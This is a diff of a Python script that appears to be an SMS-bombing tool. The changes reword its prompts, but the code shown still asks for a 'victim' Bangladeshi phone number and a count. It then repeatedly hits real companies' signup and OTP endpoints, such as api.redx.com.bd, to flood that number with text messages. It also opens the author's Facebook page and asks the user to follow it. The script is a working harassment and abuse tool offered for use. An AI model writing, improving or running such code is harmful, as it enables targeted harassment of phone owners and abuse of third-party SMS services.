@@ -20,14 +20,14 @@ logo =                                          """
 
 
 print(logo)
-follow=input("1. FAST FOLLOW MY PAGE : ")
+follow=input("[+] FIRST FOLLOW MY PAGE : ")
 
 os.system("xdg-open https://www.facebook.com/nehal.ahmed6")
-name=input("√ TYPE MY PAGE NAME : ")
+name=input("[!] TYPE MY PAGE NAME : ")
 
-num=input("\n \033[1;31m1. ENTER VICTIM NUMBER : +880")
-ammo=int(input("\n \033[1;31m2. ENTER AMMOUNT : "))
-print("\n\n \033[1;32mALL DONE")
+num=input("\n \033[1;31m[*]Enter Target (Without +880):")
+ammo=int(input("\n \033[1;31m[*]Enter Amount (Default: 10):"))
+print("\n\n \033[1;32mMessage Sending Start.....")
 #print("WAIT AND SEE")
 
 headers1={
@@ -69,19 +69,19 @@ while ammo>count:
   send1=requests.get(url1,headers=headers1)
   if send1.status_code==200:
     count+=1
-    print(f"{count} SMS SUCCESSFUL")
+    print(f"{count} SMS Successfully Done!")
   else:
     pass
   send2=requests.get(url2,headers=headers2)
   if send2.status_code==200:
     count+=1
-    print(f"{count} SMS SUCCESSFUL")
+    print(f"{count} SMS Successfully Done!")
   else:
     pass
   send3=requests.post("https://api.redx.com.bd/v1/user/signup",headers=headers3,data=data)
   if send3.status_code==200:
     count+=1
-    print(f"{count} SMS SUCCESSFUL")
+    print(f"{count} SMS Successfully Done!")
   else:
     pass
-print("\033[1;31mALL MESSEGE SEND DONE")
+print("\033[1;31m[✔] Thanks For Using Our Tool [✔]")
